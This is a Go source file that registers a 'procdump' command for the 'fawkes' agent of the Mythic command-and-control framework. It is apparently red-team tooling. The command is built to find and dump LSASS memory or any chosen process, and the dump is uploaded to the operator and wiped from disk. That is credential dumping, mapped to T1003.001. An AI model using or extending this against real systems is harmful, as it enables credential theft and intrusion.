package agentfunctions

import (
	"fmt"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "procdump",
		Description:         "Dump process memory to a minidump file using MiniDumpWriteDump. Supports automatic LSASS discovery or dumping any process by PID. Dumps are uploaded to Mythic and cleaned from disk.",
		HelpString:          "procdump\nprocdump -action lsass\nprocdump -action dump -pid 1234",
		Version:             1,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1003.001"}, // OS Credential Dumping: LSASS Memory
		SupportedUIFeatures: []string{},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				CLIName:          "action",
				ModalDisplayName: "Action",
				Description:      "Dump type: lsass (auto-find and dump lsass.exe), dump (dump process by PID)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"lsass", "dump"},
				DefaultValue:     "lsass",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "pid",
				CLIName:          "pid",
				ModalDisplayName: "Target PID",
				Description:      "Process ID to dump (required for dump action, ignored for lsass)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     0,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			action, _ := taskData.Args.GetStringArg("action")
			pid, _ := taskData.Args.GetNumberArg("pid")

			var displayMsg string
			if action == "dump" && pid > 0 {
				displayMsg = fmt.Sprintf("Dump PID %d", int(pid))
			} else {
				displayMsg = "Dump lsass.exe"
			}
			response.DisplayParams = &displayMsg

			// Artifact: process memory read
			mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
				TaskID:           taskData.Task.ID,
				BaseArtifactType: "API Call",
				ArtifactMessage:  fmt.Sprintf("MiniDumpWriteDump — %s", displayMsg),
			})
			// Artifact: temp file write
			mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
				TaskID:           taskData.Task.ID,
				BaseArtifactType: "File Write",
				ArtifactMessage:  "Write minidump to %%TEMP%% (auto-deleted after upload)",
			})

			return response
		},
	})
}
